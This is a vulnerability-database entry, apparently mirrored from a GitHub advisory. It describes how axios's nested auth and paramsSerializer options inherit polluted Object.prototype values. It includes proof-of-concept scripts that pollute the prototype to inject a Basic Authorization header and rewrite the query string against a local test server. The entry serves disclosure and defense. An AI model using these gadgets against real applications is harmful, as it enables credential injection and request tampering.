@@ -1,0 +1,323 @@
+[basic]
+description = '''
+## Summary
+
+Axios can consume inherited properties from nested request option objects when the JavaScript process already has a polluted `Object.prototype`.
+
+The top-level merged config is protected with a null prototype, but nested plain objects such as `auth` and `paramsSerializer` are cloned into ordinary objects. If application code passes placeholders such as `auth: {}` or `paramsSerializer: {}`, inherited `username`, `password`, `encode`, or `serialize` properties can influence outbound requests.
+
+## Impact
+
+This is reachable only when another component has already polluted `Object.prototype` and the application passes an affected nested axios option object.
+
+Confirmed impacts include silent injection of an `Authorization: Basic ...` header from inherited `username` and `password` values, and query-string tampering when inherited `paramsSerializer` fields are function-valued.
+
+The `auth` case requires only string-valued pollution. Full query-string replacement through `paramsSerializer.serialize` requires a function-valued pollution primitive; string-only pollution may still cause request failures or encoding changes through `encode`.
+
+This does not mean every axios request is affected. Requests that do not pass `auth`, do not pass `paramsSerializer`, or provide explicit own properties for the relevant nested fields are not affected by this specific gadget.
+
+## Affected Functionality
+
+Affected runtime functionality:
+
+- Node HTTP adapter Basic auth handling in `lib/adapters/http.js`.
+- Browser/fetch/XHR Basic auth handling through `lib/helpers/resolveConfig.js`.
+- Query serialization through `lib/helpers/buildURL.js`.
+- `axios.getUri()` when called with an affected `paramsSerializer` object.
+
+Affected config shapes:
+
+- `auth: {}` or an `auth` object missing own `username` and/or `password`.
+- `paramsSerializer: {}` or a `paramsSerializer` object missing own `encode` and/or `serialize`.
+
+Unaffected by this specific issue:
+
+- Requests with no `auth` property.
+- Requests with no `paramsSerializer` property.
+- Top-level polluted `auth` or `paramsSerializer` values in current hardened versions.
+
+## Technical Details
+
+`lib/core/mergeConfig.js` creates the top-level merged config with `Object.create(null)`, but nested object cloning still uses ordinary `{}` containers:
+
+```js
+} else if (utils.isPlainObject(source)) {
+  return utils.merge({}, source);
+}
+```
+
+Downstream code then reads nested fields without own-property checks.
+
+In `lib/helpers/resolveConfig.js`:
+
+```js
+btoa((auth.username || '') + ':' + (auth.password ? encodeUTF8(auth.password) : ''))
+```
+
+In `lib/adapters/http.js`:
+
+```js
+const username = configAuth.username || '';
+const password = configAuth.password || '';
+auth = username + ':' + password;
+```
+
+In `lib/helpers/buildURL.js`:
+
+```js
+const _encode = (options && options.encode) || encode;
+const serializeFn = _options && _options.serialize;
+```
+
+## Proof of Concept of Attack
+
+```js
+import http from 'node:http';
+import axios from './index.js';
+
+const user = 'attacker';
+const pass = 'exfil';
+
+Object.defineProperty(Object.prototype, 'username', {
+  value: user,
+  configurable: true
+});
+
+Object.defineProperty(Object.prototype, 'password', {
+  value: pass,
+  configurable: true
+});
+
+Object.defineProperty(Object.prototype, 'serialize', {
+  value: () => 'polluted=1',
+  configurable: true
+});
+
+const server = http.createServer((req, res) => {
+  res.writeHead(200, { 'content-type': 'application/json' });
+  res.end(JSON.stringify({
+    authorization: req.headers.authorization || null,
+    url: req.url
+  }));
+});
+
+await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
+
+try {
+  const port = server.address().port;
+  const response = await axios.get(`http://127.0.0.1:${port}/demo`, {
+    auth: {},
+    paramsSerializer: {},
+    params: { unused: 'ignored' }
+  });
+
+  console.log(response.data);
+} finally {
+  await new Promise((resolve) => server.close(resolve));
+  delete Object.prototype.username;
+  delete Object.prototype.password;
+  delete Object.prototype.serialize;
+}
+```
+
+Observed result:
+
+```json
+{
+  \"authorization\": \"Basic YXR0YWNrZXI6ZXhmaWw=\",
+  \"url\": \"/demo?polluted=1\"
+}
+```
+
+## Workarounds
+
+If upgrading is not yet possible, avoid passing placeholder nested option objects.
+
+Remove `auth` entirely when Basic auth is not intended. For `paramsSerializer` objects, provide explicit own `encode` and `serialize` properties or remove `paramsSerializer` when custom serialization is not required.
+
+These workarounds only address this axios gadget. They do not remediate the separate prototype-pollution primitive that must already exist in the application process.
+
+<details>
+<summary>Original Report</summary>
+
+### Summary
+axios 1.16.1 mitigates prototype-pollution gadgets on the top-level request config but not on nested option objects. When a caller passes a partial nested option object such as auth: {} or paramsSerializer: {}, axios reads inner fields (username, password, encode, serialize) through the prototype chain. If Object.prototype has been polluted by another component in the same Node.js process, those inherited values are silently injected into the outbound request, including the Authorization header and the serialized query string. 
+
+### Details
+mergeConfig (lib/core/mergeConfig.js) was hardened to use a null-prototype container for the top-level config, but its nested-clone helper still produces ordinary {} containers:
+
+mergeConfig.js Lines 36-45
+
+```
+  function getMergedValue(target, source, prop, caseless) {
+    if (utils.isPlainObject(target) && utils.isPlainObject(source)) {
+      return utils.merge.call({ caseless }, target, source);
+    } else if (utils.isPlainObject(source)) {
+      return utils.merge({}, source);
+    } else if (utils.isArray(source)) {
+      return source.slice();
+    }
+    return source;
+  }
+```
+
+The cloned nested objects therefore inherit from Object.prototype. Downstream consumers read sensitive fields via plain dotted access, with no own-property guard:
+
+Browser / fetch Basic auth — lib/helpers/resolveConfig.js:
+resolveConfig.js Lines 64-70
+```
+  if (auth) {
+    headers.set(
+      'Authorization',
+      'Basic ' +
+        btoa((auth.username || '') + ':' + (auth.password ? encodeUTF8(auth.password) : ''))
+    );
+  }
+```
+
+Node HTTP adapter Basic auth — lib/adapters/http.js:
+http.js Lines 829-836
+```
+      // HTTP basic authentication
+      let auth = undefined;
+      const configAuth = own('auth');
+      if (configAuth) {
+        const username = configAuth.username || '';
+        const password = configAuth.password || '';
+        auth = username + ':' + password;
+      }
+```
+
+paramsSerializer reads — lib/helpers/buildURL.js:
+buildURL.js Lines 31-54
+```
+export default function buildURL(url, params, options) {
+  if (!params) {
+    return url;
+  }
+  const _encode = (options && options.encode) || encode;
+  const _options = utils.isFunction(options)
+    ? {
+        serialize: options,
+      }
+    : options;
+  const serializeFn = _options && _options.serialize;
+  let serializedParams;
+  if (serializeFn) {
+    serializedParams = serializeFn(params, _options);
+  } else {
+    serializedParams = utils.isURLSearchParams(params)
+      ? params.toString()
+      : new AxiosURLSearchParams(params, _options).toString(_encode);
+  }
+```
+
+Because auth.username, auth.password, options.encode, and options.serialize are accessed without hasOwnProperty checks, a polluted Object.prototype.username / Object.prototype.password / Object.prototype.serialize flows directly into the outgoing request.
+
+The auth sink is the primary impact (silent Basic-auth injection); paramsSerializer.serialize is a secondary but powerful sink because it can fully replace the query string.
+
+### PoC
+```
+import http from 'node:http';
+import axios from '../../index.js';
+
+const ATTACKER_USER = 'attacker';
+const ATTACKER_PASS = 'exfil';
+const ATTACKER_BASIC = Buffer.from(`${ATTACKER_USER}:${ATTACKER_PASS}`).toString('base64');
+
+// Step 1: simulate a pre-existing prototype-pollution primitive in this process.
+// In reality, a separate dependency would have done this. We keep the
+// \"polluted\" properties non-enumerable so they only affect inherited reads,
+// which is the realistic shape of most prototype-pollution gadgets.
+Object.defineProperty(Object.prototype, 'username', {
+  value: ATTACKER_USER,
+  configurable: true,
+});
+Object.defineProperty(Object.prototype, 'password', {
+  value: ATTACKER_PASS,
+  configurable: true,
+});
+Object.defineProperty(Object.prototype, 'serialize', {
+  value: () => 'polluted=1',
+  configurable: true,
+});
+
+// Local capture server.
+const server = http.createServer((req, res) => {
+  const captured = {
+    authorization: req.headers['authorization'] || null,
+    url: req.url,
+  };
+  res.writeHead(200, { 'content-type': 'application/json' });
+  res.end(JSON.stringify(captured));
+});
+
+await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
+const port = server.address().port;
+
+try {
+  // Application code: passes nested *placeholder* option objects that have
+  // no own auth/serializer properties. Without prototype pollution this is
+  // a no-op. With prototype pollution it becomes attacker-controlled state.
+  const response = await axios.get(`http://127.0.0.1:${port}/demo`, {
+    auth: {},
+    paramsSerializer: {},
+    params: { unused: 'ignored-by-polluted-serializer' },
+  });
+
+  console.log('--- PoC: nested-option prototype-pollution gadgets ---');
+  console.log('Server saw:', JSON.stringify(response.data));
+
+  const authLeaked = response.data.authorization === `Basic ${ATTACKER_BASIC}`;
+  const urlRewritten = response.data.url === '/demo?polluted=1';
+
+  if (authLeaked && urlRewritten) {
+    console.log(
+      'VULNERABLE: nested auth + paramsSerializer inherited polluted ' +
+        'Object.prototype values into the outbound request.'
+    );
+    process.exitCode = 0;
+  } else {
+    console.log('NOT VULNERABLE: nested option objects did not leak prototype state.');
+    console.log('  authLeaked   =', authLeaked);
+    console.log('  urlRewritten =', urlRewritten);
+    process.exitCode = 1;
+  }
+} finally {
+  server.close();
+  // Restore Object.prototype so a noisy exit/process state cannot affect
+  // anything else accidentally sharing the runtime.
+  delete Object.prototype.username;
+  delete Object.prototype.password;
+  delete Object.prototype.serialize;
+}
+```
+
+### Impact
+Concrete consequences:
+- Silent injection of attacker-controlled Authorization: Basic … headers on outbound requests, enabling credential exfiltration to attacker-chosen upstreams or impersonation against trusted upstreams.
+- Full takeover of query-string serialization via paramsSerializer.serialize, enabling request tampering, cache-key poisoning, and bypass of upstream signature/policy checks that sign the literal request line.
+<details>
+'''
+published = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+score = 5
+severity = "MEDIUM"
+sources = ["ghsa"]
+title = "Axios: Nested axios option objects can consume polluted prototype values"
+updated = ""
+
+[exploit]
+exp_urls = []
+poc_urls = []
+
+[id]
+aliases = ["GHSA-7q8q-rj6j-mhjq"]
+ave_id = "AVE-2026-1029"
+
+[meta]
+collected_at = "2026-08-05T21:09:12.305957606+00:00"
+status = "completed"
+
+[references]
+urls = []
